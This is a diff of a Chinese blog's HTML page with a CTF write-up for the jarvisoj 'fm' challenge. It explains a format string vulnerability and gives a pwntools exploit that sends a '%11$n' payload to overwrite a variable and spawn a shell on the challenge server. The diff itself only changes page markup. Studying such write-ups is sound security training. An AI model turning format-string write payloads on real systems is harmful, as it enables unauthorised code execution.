@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="CTF,Pwn">
-    <meta name="description" content="题目信息 nc pwn2.jarvisoj.com 9895 fm.eaef2247796c11db798a579396482399  32位elf，没开PIE，其他基本都开了：  静态分析有一个明显的格式化字符串漏洞，当x为4时会执行system(“&#x2F;bin&#x2F;sh”),x的值初始化3   exploit所以就要利用格式化字符串漏洞的任意地址读写，“x_addr%[i]$n”，%n可以将已经输出的">
+    <meta name="description" content="题目信息 nc pwn2.jarvisoj.com 9895 fm.eaef2247796c11db798a579396482399  32位elf，没开PIE，其他基本都开了：                                                                                                             静态">
 <meta property="og:type" content="article">
 <meta property="og:title" content="61dctf fm">
 <meta property="og:url" content="https://darkwing.moe/2019/05/23/61dctf-fm/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="题目信息 nc pwn2.jarvisoj.com 9895 fm.eaef2247796c11db798a579396482399  32位elf，没开PIE，其他基本都开了：  静态分析有一个明显的格式化字符串漏洞，当x为4时会执行system(“&#x2F;bin&#x2F;sh”),x的值初始化3   exploit所以就要利用格式化字符串漏洞的任意地址读写，“x_addr%[i]$n”，%n可以将已经输出的">
+<meta property="og:description" content="题目信息 nc pwn2.jarvisoj.com 9895 fm.eaef2247796c11db798a579396482399  32位elf，没开PIE，其他基本都开了：                                                                                                             静态">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052301.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052302.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052303.jpg">
@@ -124,7 +124,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -214,17 +214,52 @@
 <p><a href="https://dn.jarvisoj.com/challengefiles/fm.eaef2247796c11db798a579396482399" target="_blank" rel="noopener">fm.eaef2247796c11db798a579396482399</a></p>
 </blockquote>
 <p>32位elf，没开PIE，其他基本都开了：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052301.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052301.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>有一个明显的格式化字符串漏洞，当x为4时会执行system(“/bin/sh”),x的值初始化3</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052302.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052303.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052302.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052303.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><p>所以就要利用格式化字符串漏洞的任意地址读写，“x_addr%[i]$n”，%n可以将已经输出的字符个数写入到指定的参数中，这个格式化字符串会在栈上的某处，需要定位x_addr作为printf的第几个参数来确定[i]的值，由于x_addr在32位程序中刚好是4个字节，所以这个格式化字符串刚好能把相应参数变为4。通过gdb确定位置</p>
 <p>可以确定是第11个参数：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052304.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052304.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>那么就可以把AAAA替换为x的地址，p换成n就可以把x写成4</p>
 <h2 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./fm'</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9895</span>)</span><br><span class="line"><span class="comment"># sh = process('./fm')</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">x_addr = <span class="number">0x0804A02C</span></span><br><span class="line"></span><br><span class="line">payload = p32(x_addr) + <span class="string">"%11$n"</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052305.jpg" alt=""></p>
+<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052305.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 
         </div>
 
